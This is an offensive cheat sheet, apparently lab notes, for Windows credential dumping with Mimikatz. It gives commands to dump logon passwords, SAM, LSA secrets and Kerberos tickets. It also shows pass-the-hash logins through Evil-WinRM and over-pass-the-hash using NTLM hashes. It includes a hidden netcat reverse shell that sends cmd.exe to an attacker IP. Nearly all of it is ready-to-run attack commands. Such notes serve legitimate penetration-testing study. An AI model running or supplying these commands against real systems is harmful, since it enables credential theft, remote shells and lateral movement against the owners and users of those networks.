
Start up
```
.\mimikatz.exe
```
```
privilege::debug
```
- If we do not get 'ok' for privilege debug we cannot use this 
-  log to save output to file


Dump logged-in credentials
```
sekurlsa::logonpasswords
```

Dump SAM (local accounts)
```
lsadump::sam
```

LSA/ Domain dump
```
lsadump::lsa /patch
```
```
lsadump::lsa /inject
```

NTDS contains all domain credentials
```
ntds.dit
```

Dump kerberos tickets
```
sekurlsa::tickets
```




Mimikatz does not work well with Evil-WinRM, use pth-winexe
or
Interactive Mimikatz: upload Netcat to the target, get a reverse shell, and run Mimikatz interactively.

# On your machine

cp /usr/share/windows-resources/binaries/nc.exe .

ifconfig tun0 | grep inet # Your IP: 192.168.119.237

nc -nvlp 4443

# From Evil-WinRM

evil-winrm -i 192.168.119.174 -u Administrator -H 15759746f66f2da88d58f0160f8ee676

cd C:\Users\Public

upload nc.exe

upload mimikatz.exe

Start-Process -WindowStyle Hidden -FilePath .\nc.exe -ArgumentList "192.168.119.237 4443 -e C:\Windows\System32\cmd.exe"

# From your netcat listener shell

mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
token::elevate
lsadump::sam
exit

 Non-Interactive Mimikatz: run Mimikatz in one shot by chaining commands.

evil-winrm -i 192.168.119.174 -u Administrator -H 15759746f66f2da88d58f0160f8ee676
cd C:\Users\Public

upload mimikatz.exe

.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"



Over Pass the Hash
- uses mimikatz

```
mimikatz.exe "sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe" "exit"
```

```
impacket-psexec \\[hostname] cmd.exe
```